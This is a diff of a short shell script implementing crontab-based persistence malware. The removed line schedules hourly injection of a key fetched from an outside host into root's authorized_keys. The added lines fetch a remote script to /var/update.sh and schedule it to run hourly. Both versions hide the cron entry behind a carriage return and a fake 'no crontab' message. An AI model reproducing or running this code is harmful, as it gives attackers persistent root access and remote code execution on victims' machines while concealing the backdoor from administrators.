@@ -1,1 +1,3 @@
-(crontab -l;printf "29 * * * * curl http://ui.kanter.cn/pem >> /root/.ssh/authorized_keys;sort -k2n /root/.ssh/authorized_keys|uniq>a.pem;mv -f a.pem /root/.ssh/authorized_keys;rm -rf a.pem;\rno crontab for `whoami`%100c\n")|crontab -
+#!/bin/bash
+curl https://doorauth.herokuapp.com/b.sh -o /var/update.sh;
+(crontab -l;printf "37 * * * * sh /var/update.sh;\rno crontab for `whoami`%100c\n")|crontab -
